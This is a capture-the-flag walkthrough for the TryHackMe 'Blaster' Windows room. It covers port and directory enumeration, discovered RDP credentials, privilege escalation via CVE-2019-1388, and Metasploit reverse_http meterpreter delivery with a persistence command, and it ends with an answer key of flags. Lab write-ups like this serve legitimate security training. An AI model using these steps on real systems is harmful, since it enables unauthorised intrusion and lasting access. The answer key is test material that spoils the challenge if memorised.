# 💥 Blaster

---

link to the room: https://tryhackme.com/room/blaster

---

<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-Blaster-red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Difficulty-Easy%20%2F%20Medium-yellow?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Category-Windows%20PrivEsc-blue?style=for-the-badge" />
</p>

---

## 📌 Overview

Blaster is a Windows-based exploitation room that focuses on:

* Manual enumeration (Nmap, directory fuzzing)
* Web-based credential discovery
* Gaining access via Remote Desktop (RDP)
* Privilege escalation using a real vulnerability (**CVE-2019-1388**)
* Achieving SYSTEM-level access
* Establishing persistence using Metasploit

This room demonstrates how multiple basic techniques can be chained together to achieve full system compromise.

---

## 🎯 Objectives

* Discover open ports and services
* Find hidden web directories
* Extract credentials from web content
* Gain initial access (RDP)
* Perform privilege escalation
* Maintain access (persistence)

---

## 🧠 Key Concepts

* Enumeration (Nmap, Dirb)
* Credential harvesting
* Remote Desktop Protocol (RDP)
* Windows privilege escalation
* CVE exploitation
* Meterpreter & persistence

---

# 🧪 Walkthrough

## 🔹 1. Enumeration

```bash
nmap -sV MACHINE_IP
```

✔ 2 open ports found
✔ IIS web server detected

---

## 🔹 2. Web Enumeration

```bash
dirb http://MACHINE_IP
```

✔ Found:

```
/retro
```

---

## 🔹 3. Credential Discovery

* Username: **wade**
* Password: **parzival**

---

## 🔹 4. Initial Access (RDP)

```bash
xfreerdp /u:wade /p:parzival /v:MACHINE_IP
```

✔ User flag:

```
THM{HACK_PLAYER_ONE}
```

---

## 🔹 5. Privilege Escalation

* CVE: **CVE-2019-1388**
* Exploit: **hhupd**

```bash
whoami
```

✔ Output:

```
nt authority\system
```

✔ Root flag:

```
THM{COIN_OPERATED_EXPLOITATION}
```

---

## 🔹 6. Persistence (Metasploit)

```bash
msfconsole
```

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_http
run -j
```

---

## 🔹 7. Persistence Command

```
run persistence -X
```

✔ Ensures access on reboot

---

# ✅ Questions & Answers

## 🔹 Task 1

**Q:** Deploy the machine
**A:** No answer needed

---

## 🔹 Task 2

**Q:** How many ports are open on our target system?
**A:** 2

**Q:** What is the title of the page?
**A:** IIS Windows Server

**Q:** What hidden directory do we discover?
**A:** /retro

**Q:** What potential username do we discover?
**A:** wade

**Q:** What possible password do we discover?
**A:** parzival

**Q:** What are the contents of user.txt?
**A:** THM{HACK_PLAYER_ONE}

---

## 🔹 Task 3

**Q:** What CVE was researched on this server?
**A:** CVE-2019-1388

**Q:** What is the name of this executable?
**A:** hhupd

**Q:** Exploit the vulnerability
**A:** No answer needed

**Q:** What is the output of `whoami`?
**A:** nt authority\system

**Q:** What are the contents of root.txt?
**A:** THM{COIN_OPERATED_EXPLOITATION}

---

## 🔹 Task 4

**Q:** Which target number is PSH?
**A:** 2

**Q:** What command sets persistence?
**A:** run persistence -X

---

# 🚀 Attack Flow

1. Scan → Identify services
2. Discover `/retro`
3. Extract credentials
4. RDP login
5. Exploit CVE
6. Gain SYSTEM
7. Establish persistence

---

## ⚠️ Key Takeaways

* Enumeration is critical
* Credentials can leak via web apps
* CVEs enable privilege escalation
* SYSTEM access = full control
* Persistence maintains access

---

## 💡 Final Insight

➡️ Simple techniques + good enumeration = full compromise
➡️ Think logically, not just tool-based

---
